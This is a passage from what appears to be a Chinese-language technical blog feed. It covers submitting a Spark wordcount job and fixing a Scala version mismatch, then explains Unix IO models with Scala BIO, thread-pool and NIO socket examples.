--total-executor-cores NUM  Total cores for all executors.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Spark standalone and YARN only:</span></span><br><span class="line"><span class="string">  --executor-cores NUM        Number of cores per executor. (Default: 1 in YARN mode,</span></span><br><span class="line"><span class="string">                              or all available cores on the worker in standalone mode)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> YARN-only:</span></span><br><span class="line"><span class="string">  --queue QUEUE_NAME          The YARN queue to submit to (Default: "default").</span></span><br><span class="line"><span class="string">  --num-executors NUM         Number of executors to launch (Default: 2).</span></span><br><span class="line"><span class="string">                              If dynamic allocation is enabled, the initial number of</span></span><br><span class="line"><span class="string">                              executors will be at least NUM.</span></span><br><span class="line"><span class="string">  --archives ARCHIVES         Comma separated list of archives to be extracted into the</span></span><br><span class="line"><span class="string">                              working directory of each executor.</span></span><br><span class="line"><span class="string">  --principal PRINCIPAL       Principal to be used to login to KDC, while running on</span></span><br><span class="line"><span class="string">                              secure HDFS.</span></span><br><span class="line"><span class="string">  --keytab KEYTAB             The full path to the file that contains the keytab for the</span></span><br><span class="line"><span class="string">                              principal specified above. This keytab will be copied to</span></span><br><span class="line"><span class="string">                              the node running the Application Master via the Secure</span></span><br><span class="line"><span class="string">                              Distributed Cache, for renewing the login tickets and the</span></span><br><span class="line"><span class="string">                              delegation tokens periodically.</span></span><br></pre></td></tr></table></figure>
<p>每一个选项都写的很清楚了,这里不做解释了.</p>
<p>提交任务,将输出信息保存到磁盘中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">spark-submit --master spark://hadoop01:7077 --class com.xwolf.bigdata.WordCount --name  wordCount /opt/bigdata/slibs/spark-1.0-SNAPSHOT.jar  &gt; /opt/wordcount_result.txt</span><br></pre></td></tr></table></figure>
<p>抛出下边的异常信息:</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="type">Exception</span> in thread <span class="string">"main"</span> java.lang.<span class="type">BootstrapMethodError</span>: java.lang.<span class="type">NoClassDefFoundError</span>: sc           ala/runtime/java8/<span class="type">JFunction2</span>$mcIII$sp</span><br><span class="line">        at com.xwolf.bigdata.<span class="type">WordCount</span>$.main(<span class="type">WordCount</span>.scala:<span class="number">15</span>)</span><br><span class="line">        at com.xwolf.bigdata.<span class="type">WordCount</span>.main(<span class="type">WordCount</span>.scala)</span><br><span class="line">        at sun.reflect.<span class="type">NativeMethodAccessorImpl</span>.invoke0(<span class="type">Native</span> <span class="type">Method</span>)</span><br><span class="line">        at sun.reflect.<span class="type">NativeMethodAccessorImpl</span>.invoke(<span class="type">NativeMethodAccessorImpl</span>.java:<span class="number">62</span>)</span><br><span class="line">        at sun.reflect.<span class="type">DelegatingMethodAccessorImpl</span>.invoke(<span class="type">DelegatingMethodAccessorImpl</span>.java:           <span class="number">43</span>)</span><br><span class="line">        at java.lang.reflect.<span class="type">Method</span>.invoke(<span class="type">Method</span>.java:<span class="number">498</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">JavaMainApplication</span>.start(<span class="type">SparkApplication</span>.scala:<span class="number">52</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>.org$apache$spark$deploy$<span class="type">SparkSubmit</span>$$runMain(<span class="type">S</span>           parkSubmit.scala:<span class="number">849</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>.doRunMain$<span class="number">1</span>(<span class="type">SparkSubmit</span>.scala:<span class="number">167</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>.submit(<span class="type">SparkSubmit</span>.scala:<span class="number">195</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>.doSubmit(<span class="type">SparkSubmit</span>.scala:<span class="number">86</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>$$anon$<span class="number">2.</span>doSubmit(<span class="type">SparkSubmit</span>.scala:<span class="number">924</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>$.main(<span class="type">SparkSubmit</span>.scala:<span class="number">933</span>)</span><br><span class="line">        at org.apache.spark.deploy.<span class="type">SparkSubmit</span>.main(<span class="type">SparkSubmit</span>.scala)</span><br><span class="line"><span class="type">Caused</span> by: java.lang.<span class="type">NoClassDefFoundError</span>: scala/runtime/java8/<span class="type">JFunction2</span>$mcIII$sp</span><br><span class="line">        ... <span class="number">14</span> more</span><br><span class="line"><span class="type">Caused</span> by: java.lang.<span class="type">ClassNotFoundException</span>: scala.runtime.java8.<span class="type">JFunction2</span>$mcIII$sp</span><br><span class="line">        at java.net.<span class="type">URLClassLoader</span>.findClass(<span class="type">URLClassLoader</span>.java:<span class="number">382</span>)</span><br><span class="line">        at java.lang.<span class="type">ClassLoader</span>.loadClass(<span class="type">ClassLoader</span>.java:<span class="number">424</span>)</span><br><span class="line">        at java.lang.<span class="type">ClassLoader</span>.loadClass(<span class="type">ClassLoader</span>.java:<span class="number">357</span>)</span><br><span class="line">        ... <span class="number">14</span> more</span><br></pre></td></tr></table></figure>
<p>spark 依赖的 scala 版本为 2.11.12,安装的 scala 的 2.12,本机打包的 scala 环境也是 2.12。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 jars]<span class="comment"># ll -ah scala-</span></span><br><span class="line">scala-compiler-2.11.12.jar               scala-reflect-2.11.12.jar</span><br><span class="line">scala-library-2.11.12.jar                scala-xml_2.11-1.0.5.jar</span><br><span class="line">scala-parser-combinators_2.11-1.1.0.jar</span><br></pre></td></tr></table></figure>
<p>先统一 scala 版本，都修改为 2.11.12 版本。重新打包上传后可正常运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提交job</span></span><br><span class="line">[root@hadoop01 slibs]<span class="comment"># spark-submit --master yarn --class com.xwolf.bigdata.WordCount --name  wordCount /opt/bigdata/slibs/spark-1.0-SNAPSHOT.jar &amp;&gt; /opt/wordcount_result.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看输出内容</span></span><br><span class="line">[root@hadoop01 slibs]<span class="comment"># cat /opt/wordcount_result.txt</span></span><br><span class="line">2019-04-15 18:53:59 WARN  NativeCodeLoader:62 - Unable to load native-hadoop library <span class="keyword">for</span> your platform... using <span class="built_in">builtin</span>-java classes <span class="built_in">where</span> applicable</span><br><span class="line">2019-04-15 18:54:00 INFO  SparkContext:54 - Running Spark version 2.4.0</span><br><span class="line">2019-04-15 18:54:00 INFO  SparkContext:54 - Submitted application: wordCount</span><br><span class="line">2019-04-15 18:54:00 INFO  SecurityManager:54 - Changing view acls to: root</span><br><span class="line">2019-04-15 18:54:00 INFO  SecurityManager:54 - Changing modify acls to: root</span><br><span class="line">2019-04-15 18:54:00 INFO  SecurityManager:54 - Changing view acls groups to:</span><br><span class="line">2019-04-15 18:54:00 INFO  SecurityManager:54 - Changing modify acls groups to:</span><br><span class="line">2019-04-15 18:54:00 INFO  SecurityManager:54 - SecurityManager: authentication disabled; ui acls disabled; users  with view permissions: Set(root); groups with view permissions: Set(); users  with modify permissions: Set(root); groups with modify permissions: Set()</span><br><span class="line">2019-04-15 18:55:35 INFO  DAGScheduler:54 - Job 0 finished: collect at WordCount.scala:15, took 45.183481 s</span><br><span class="line">(package,1)</span><br><span class="line">(this,1)</span><br><span class="line">(integration,1)</span><br><span class="line">(Because,1)</span><br><span class="line">(Python,2)</span><br><span class="line">(cluster.,1)</span><br><span class="line">([run,1)</span><br><span class="line">(There,1)</span><br><span class="line">(its,1)</span><br><span class="line">(YARN,,1)</span><br><span class="line">(have,1)</span><br><span class="line">(general,3)</span><br><span class="line">(pre-built,1)</span><br><span class="line">(locally,2)</span><br><span class="line">(locally.,1)</span><br><span class="line">(changed,1)</span><br><span class="line">(sc.parallelize(1,1)</span><br><span class="line">(only,1)</span><br><span class="line">(page](http://spark.apache.org/documentation.html).,1)</span><br><span class="line">(Configuration,1)</span><br><span class="line">(This,2)</span><br><span class="line">(first,1)</span><br><span class="line">(basic,1)</span><br></pre></td></tr></table></figure>
<p>在 spark 管理界面可以看到运行的任务和日志等信息.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://spark.apache.org/docs/latest/index.html" target="_blank" rel="noopener">Apache Spark 官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Scala/Java IO（BIO/NIO）</title>
    <url>/2017/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE/Scala(Java)%20IO(BIO&amp;NIO)/</url>
    <content><![CDATA[<blockquote>
<h1 id="一、Unix-IO-模型"><a href="#一、Unix-IO-模型" class="headerlink" title="一、Unix IO 模型"></a>一、Unix IO 模型</h1><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><ul>
<li>阻塞IO (Blocking IO)</li>
<li>非阻塞IO (Non-Blocking IO)</li>
<li>复用IO (Multiplexing IO)</li>
<li>信号驱动IO</li>
<li>异步IO (Asynchronous IO)</li>
</ul>
<h4 id="1-1-阻塞IO"><a href="#1-1-阻塞IO" class="headerlink" title="1.1 阻塞IO"></a>1.1 阻塞IO</h4></blockquote>
<p>同步阻塞 IO 模型是最常用的一个模型，也是最简单的模型。在Unix中，缺省情况下所有的文件操作都是阻塞的。它符合人们最常见的思考逻辑。阻塞就是进程 “被” 休息, CPU处理其它进程去了。</p>
<p>在这个IO模型中，用户空间的应用程序执行一个系统调用（recvform），这会导致应用程序阻塞，什么也不干，直到数据准备好，并且将数据从内核复制到用户进程，最后进程再处理数据，在等待数据到处理数据的两个阶段，整个进程都被阻塞。不能处理别的网络IO。调用应用程序处于一种不再消费 CPU 而只是简单等待响应的状态，因此从处理的角度来看，这是非常有效的。在调用recv()/recvfrom()函数时，发生在内核中等待数据和复制数据的过程，大致如下图：</p>
<p><img src="https://i.imgur.com/ivDvOaH.png" alt></p>
<blockquote>
<h4 id="1-2-非阻塞IO"><a href="#1-2-非阻塞IO" class="headerlink" title="1.2 非阻塞IO"></a>1.2 非阻塞IO</h4></blockquote>
<p>在这种模型中，设备是以非阻塞的形式打开的。这意味着 IO 操作不会立即完成，read 操作可能会返回一个错误代码，说明这个命令不能立即满足（EAGAIN 或 EWOULDBLOCK）。</p>
<p>在网络IO时候，非阻塞IO也会进行recvform系统调用，检查数据是否准备好，与阻塞IO不一样，”非阻塞将大的整片时间的阻塞分成N多的小的阻塞, 所以进程不断地有机会 ‘被’ CPU光顾”。</p>
<p>也就是说非阻塞的recvform系统调用调用之后，进程并没有被阻塞，内核马上返回给进程，如果数据还没准备好，此时会返回一个error。进程在返回之后，可以干点别的事情，然后再发起recvform系统调用。重复上面的过程，循环往复的进行recvform系统调用。这个过程通常被称之为轮询。轮询检查内核数据，直到数据准备好，再拷贝数据到进程，进行数据处理。需要注意，拷贝数据整个过程，进程仍然是属于阻塞的状态。</p>
<p><img src="https://i.imgur.com/T6ZZt7D.png" alt></p>
<blockquote>
<h4 id="1-3-多路复用IO"><a href="#1-3-多路复用IO" class="headerlink" title="1.3 多路复用IO"></a>1.3 多路复用IO</h4></blockquote>
<p>由于同步非阻塞方式需要不断主动轮询，轮询占据了很大一部分过程，轮询会消耗大量的CPU时间，而 “后台” 可能有多个任务在同时进行，人们就想到了循环查询多个任务的完成状态，只要有任何一个任务完成，就去处理它。如果轮询不是进程的用户态，而是有人帮忙就好了。那么这就是所谓的 “IO 多路复用”。UNIX/Linux 下的 select、poll、epoll 就是干这个的（epoll 比 poll、select 效率高，做的事情是一样的）。</p>
<p>IO多路复用有两个特别的系统调用select、poll、epoll函数。select调用是内核级别的，select轮询相对非阻塞的轮询的区别在于—-前者可以等待多个socket，能实现同时对多个IO端口进行监听，当其中任何一个socket的数据准好了，就能返回进行可读，然后进程再进行recvform系统调用，将数据由内核拷贝到用户进程，当然这个过程是阻塞的。select或poll调用之后，会阻塞进程，与blocking IO阻塞不同在于，此时的select不是等到socket数据全部到达再处理, 而是有了一部分数据就会调用用户进程来处理。如何知道有一部分数据到达了呢？监视的事情交给了内核，内核负责数据到达的处理。也可以理解为”非阻塞”吧。</p>
<p>I/O复用模型会用到select、poll、epoll函数，这几个函数也会使进程阻塞，但是和阻塞I/O所不同的的，这两个函数可以同时阻塞多个I/O操作。而且可以同时对多个读操作，多个写操作的I/O函数进行检测，直到有数据可读或可写时（注意不是全部数据可读或可写），才真正调用I/O操作函数。</p>
<p><img src="https://i.imgur.com/UxIhqXN.png" alt></p>
<blockquote>
<h4 id="1-4-信号驱动IO"><a href="#1-4-信号驱动IO" class="headerlink" title="1.4 信号驱动IO"></a>1.4 信号驱动IO</h4></blockquote>
<p>信号驱动IO，不是异步IO。<br>信号驱动IO是指：进程预先告知内核，使得 当某个socketfd有events（事件）发生时，内核使用信号通知相关进程。<br>异步IO（Asynchronous IO）是指：进程执行IO系统调用（read / write）告知内核启动某个IO操作，内核启动IO操作后立即返回到进程。IO操作即内核当中的服务例程。Posix 通过 aio_XXX函数提供真正的异步IO（参见 man 7 aio).<br><img src="https://i.imgur.com/DIosmA2.png" alt></p>
<blockquote>
<h4 id="1-5-异步IO"><a href="#1-5-异步IO" class="headerlink" title="1.5 异步IO"></a>1.5 异步IO</h4></blockquote>
<p>在计算机科学中，异步I / O或“非顺序I / O”是输入/输出处理的一种形式，允许其他处理在传输完成之前继续。<br>与数据处理相比，计算机上的输入和输出（I / O）操作可能非常慢。I / O设备可以结合必须物理移动的机械设备，例如寻求磁道读取或写入的硬盘驱动器; 这通常比电流切换慢几个数量级。例如，在执行10毫秒的磁盘操作期间，以一千兆赫兹计时的处理器可能已经执行了1000万条指令处理周期。<br>I / O的简单方法是启动访问，然后等待它完成。但是，这种方法（称为同步阻塞I / O）会在通信进行中阻止程序的进展，从而使系统资源闲置。当程序进行许多I / O操作（例如主要或很大程度上取决于用户输入的程序）时，这意味着处理器几乎可以花费几乎所有的时间空闲等待I / O操作完成。<br>或者，可以开始通信，然后执行不要求I / O完成的处理。这种方法称为异步输入/输出。依赖I / O完成的任务（包括使用输入值和关键操作来声明确保写操作已经完成）仍然需要等待I / O操作完成，因此是仍然被阻塞，但是不能依赖于I / O操作的其他处理可以继续。<br>存在许多操作系统功能以在多个层次上实现异步I / O。事实上，除了最基本的操作系统之外，除了最基本的异步I / O之外，其中一个主要功能是执行至少某种形式的基本异步I / O，尽管这对于操作员或程序员来说可能不是特别明显。在最简单的软件解决方案中，会间隔轮询硬件设备状态，以检测设备是否准备好进行下一个操作。（例如，CP / M操作系统是这样构建的，它的系统调用语义不需要比这更复杂的I / O结构，尽管大多数实现更复杂，从而更有效）直接内存访问（DMA）可以大大提高基于轮询的系统的效率，并且硬件中断可以完全消除轮询的需要。多任务操作系统可以利用硬件中断提供的功能，同时隐藏用户中断处理的复杂性。假脱机是旨在利用异步I / O的多任务处理的第一种形式之一。最后，用户进程中的多线程和显式异步I / O API可以进一步利用异步I / O，代价是额外的软件复杂性。<br>异步I / O用于提高吞吐量，延迟和/或响应能力。</p>
<p><img src="https://i.imgur.com/m77of5n.png" alt></p>
<blockquote>
<h1 id="二、Scala-java-IO"><a href="#二、Scala-java-IO" class="headerlink" title="二、Scala(java) IO"></a>二、Scala(java) IO</h1><h4 id="2-1-BIO（socket为例）"><a href="#2-1-BIO（socket为例）" class="headerlink" title="2.1  BIO（socket为例）"></a>2.1  BIO（socket为例）</h4><p>server<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.&#123;<span class="type">InetSocketAddress</span>, <span class="type">ServerSocket</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BioServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">    <span class="keyword">val</span> serverSocket = <span class="keyword">new</span> <span class="type">ServerSocket</span>()</span><br><span class="line">    <span class="keyword">val</span> socketAddress = <span class="keyword">new</span> <span class="type">InetSocketAddress</span>(host,port)</span><br><span class="line">    serverSocket.bind(socketAddress)</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">val</span> socket = serverSocket.accept()</span><br><span class="line">      <span class="keyword">new</span> <span class="type">BioServerHandler</span>(socket).start()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">BioServer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server = <span class="keyword">new</span> <span class="type">BioServer</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9543</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//serverHandler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.&#123;<span class="type">BufferedReader</span>, <span class="type">InputStreamReader</span>, <span class="type">PrintWriter</span>&#125;</span><br><span class="line"><span class="keyword">import</span> java.net.<span class="type">Socket</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.util.control.<span class="type">Breaks</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BioServerHandler</span>(<span class="params">val socket:<span class="type">Socket</span></span>) <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>() = &#123;</span><br><span class="line">    <span class="keyword">var</span> bufferedReader:<span class="type">BufferedReader</span> = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> printWriter:<span class="type">PrintWriter</span> = <span class="literal">null</span></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">        bufferedReader = <span class="keyword">new</span> <span class="type">BufferedReader</span>(<span class="keyword">new</span> <span class="type">InputStreamReader</span>(socket.getInputStream))</span><br><span class="line">        printWriter = <span class="keyword">new</span> <span class="type">PrintWriter</span>(socket.getOutputStream,<span class="literal">true</span>)</span><br><span class="line">        <span class="keyword">val</span> content:<span class="type">StringBuilder</span>= <span class="keyword">new</span> <span class="type">StringBuilder</span></span><br><span class="line">        <span class="keyword">val</span> loop = <span class="keyword">new</span> <span class="type">Breaks</span></span><br><span class="line">        loop.breakable &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">val</span> readLine = bufferedReader.readLine()</span><br><span class="line">            println(<span class="string">s"server获取的内容:<span class="subst">$readLine</span>"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"EXIT"</span>.equalsIgnoreCase(readLine) || readLine==<span class="literal">null</span>)&#123;</span><br><span class="line">              loop.<span class="keyword">break</span>()</span><br><span class="line">            &#125;</span><br><span class="line">            content.append(readLine)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        println(<span class="string">"server接收的内容:"</span>+content.toString())</span><br><span class="line">        printWriter.println(<span class="string">"已经收到客户端内容:"</span>+content.toString())</span><br><span class="line">    &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">           <span class="keyword">case</span> ex :<span class="type">Exception</span> =&gt; println(ex.getMessage)</span><br><span class="line">     &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">       bufferedReader.close()</span><br><span class="line">       printWriter.close()</span><br><span class="line">       socket.close()</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>client:</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.&#123;<span class="type">BufferedReader</span>, <span class="type">InputStreamReader</span>, <span class="type">PrintWriter</span>&#125;</span><br><span class="line"><span class="keyword">import</span> java.net.<span class="type">Socket</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BioClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">connect</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">    <span class="keyword">val</span> socket = <span class="keyword">new</span> <span class="type">Socket</span>(host,port)</span><br><span class="line">    <span class="keyword">var</span> bufferedReader:<span class="type">BufferedReader</span> = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> printWriter:<span class="type">PrintWriter</span> = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      bufferedReader = <span class="keyword">new</span> <span class="type">BufferedReader</span>(<span class="keyword">new</span> <span class="type">InputStreamReader</span>(socket.getInputStream))</span><br><span class="line">      printWriter = <span class="keyword">new</span> <span class="type">PrintWriter</span>(socket.getOutputStream,<span class="literal">true</span>)</span><br><span class="line">      printWriter.println(<span class="string">"client 发送：socket通信测试"</span>)</span><br><span class="line">      printWriter.println(<span class="string">"EXIT"</span>)</span><br><span class="line">      <span class="keyword">val</span> content = bufferedReader.readLine();</span><br><span class="line">      println(<span class="string">s"server接收的内容:<span class="subst">$content</span>"</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">      <span class="keyword">case</span> ex :<span class="type">Exception</span> =&gt; println(ex.getMessage)</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">      bufferedReader.close()</span><br><span class="line">      printWriter.close()</span><br><span class="line">      socket.close()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">BioClient</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> client = <span class="keyword">new</span> <span class="type">BioClient</span></span><br><span class="line">    client.connect(<span class="string">"localhost"</span>,<span class="number">9543</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="2-2-伪异步IO"><a href="#2-2-伪异步IO" class="headerlink" title="2.2 伪异步IO"></a>2.2 伪异步IO</h4></blockquote>
<p>使用线程池来实现伪异步IO通信,上述阻塞IO改造一下.</p>
<p>server端改造一下，其他不变。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.&#123;<span class="type">InetSocketAddress</span>, <span class="type">ServerSocket</span>&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.<span class="type">Executors</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BioServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">    <span class="keyword">val</span> serverSocket = <span class="keyword">new</span> <span class="type">ServerSocket</span>()</span><br><span class="line">    <span class="keyword">val</span> socketAddress = <span class="keyword">new</span> <span class="type">InetSocketAddress</span>(host,port)</span><br><span class="line">    serverSocket.bind(socketAddress)</span><br><span class="line">    <span class="comment">//线程池</span></span><br><span class="line">    <span class="keyword">val</span> executors = <span class="type">Executors</span>.newFixedThreadPool(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">val</span> socket = serverSocket.accept()</span><br><span class="line">      executors.submit(<span class="keyword">new</span> <span class="type">BioServerHandler</span>(socket))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">BioServer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server = <span class="keyword">new</span> <span class="type">BioServer</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9543</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="2-3-NIO"><a href="#2-3-NIO" class="headerlink" title="2.3 NIO"></a>2.3 NIO</h4></blockquote>
<p>NIO主要有三大核心部分：Channel(通道)，Buffer(缓冲区), Selector。传统IO基于字节流和字符流进行操作，而NIO基于Channel和Buffer(缓冲区)进行操作，数据总是从通道读取到缓冲区中，或者从缓冲区写入到通道中。Selector(选择区)用于监听多个通道的事件（比如：连接打开，数据到达）。因此，单个线程可以监听多个数据通道。</p>
<p>NIO和传统IO（一下简称IO）之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。</p>
<p>IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。 NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取。而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel）。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.<span class="type">InetSocketAddress</span></span><br><span class="line"><span class="keyword">import</span> java.nio.<span class="type">ByteBuffer</span></span><br><span class="line"><span class="keyword">import</span> java.nio.channels.&#123;<span class="type">SelectionKey</span>, <span class="type">Selector</span>, <span class="type">ServerSocketChannel</span>, <span class="type">SocketChannel</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NIOServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host: <span class="type">String</span>, port: <span class="type">Int</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">//创建</span></span><br><span class="line">    <span class="keyword">val</span> selector = <span class="type">Selector</span>.open()</span><br><span class="line">    <span class="keyword">val</span> serverSocketChannel = <span class="type">ServerSocketChannel</span>.open()</span><br><span class="line">    <span class="keyword">val</span> address = <span class="keyword">new</span> <span class="type">InetSocketAddress</span>(host, port)</span><br><span class="line">    serverSocketChannel.configureBlocking(<span class="literal">false</span>)</span><br><span class="line">    <span class="comment">//绑定指定端口</span></span><br><span class="line">    serverSocketChannel.socket().bind(address)</span><br><span class="line">    <span class="comment">//注册多路复用器,监听ACCEPT事件</span></span><br><span class="line">    serverSocketChannel.register(selector, <span class="type">SelectionKey</span>.<span class="type">OP_ACCEPT</span>, <span class="type">ByteBuffer</span>.allocate(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      selector.select(<span class="number">1000</span>)</span><br><span class="line">      <span class="keyword">val</span> keys = selector.selectedKeys().iterator()</span><br><span class="line">      <span class="keyword">while</span> (keys.hasNext) &#123;</span><br><span class="line">        <span class="keyword">val</span> key = keys.next</span><br><span class="line">        keys.remove</span><br><span class="line">        <span class="keyword">if</span> (key.isValid)&#123;</span><br><span class="line">          <span class="comment">//链接状态</span></span><br><span class="line">          <span class="keyword">if</span> (key.isConnectable) &#123;</span><br><span class="line">              println(<span class="string">"server 连接.."</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// accept 操作,处理新接入的操作</span></span><br><span class="line">          <span class="keyword">if</span> (key.isAcceptable) &#123;</span><br><span class="line">            println(<span class="string">"server 接收新请求"</span>)</span><br><span class="line">            <span class="keyword">val</span> serverSocketChannel:<span class="type">ServerSocketChannel</span> = key.channel().asInstanceOf[<span class="type">ServerSocketChannel</span>]</span><br><span class="line">            <span class="keyword">val</span> socketChannel = serverSocketChannel.accept()</span><br><span class="line">            <span class="comment">//设置为非阻塞模式</span></span><br><span class="line">            socketChannel.configureBlocking(<span class="literal">false</span>)</span><br><span class="line">            <span class="comment">//注册到多路复用器上,监听读操作，读取客户端发送的内容</span></span><br><span class="line">            socketChannel.register(selector,<span class="type">SelectionKey</span>.<span class="type">OP_READ</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//可读</span></span><br><span class="line">          <span class="keyword">if</span> (key.isReadable) &#123;</span><br><span class="line">            